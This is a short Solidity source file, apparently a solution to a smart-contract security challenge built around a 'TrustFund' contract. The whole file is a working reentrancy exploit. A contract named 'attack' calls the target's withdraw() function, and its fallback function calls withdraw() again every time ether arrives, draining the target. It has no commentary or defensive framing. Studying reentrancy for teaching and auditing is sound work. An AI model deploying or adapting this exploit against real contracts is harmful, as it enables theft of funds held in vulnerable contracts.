pragma solidity 0.4.24;
import "./TrustFund.sol";

contract attack{
    address public aimAddr;
    
    function reen(address _addr) public {
        aimAddr = _addr;
        _addr.call(bytes4(keccak256("withdraw()")));
    }
    
    function () public payable{
        aimAddr.call(bytes4(keccak256("withdraw()")));
    }
}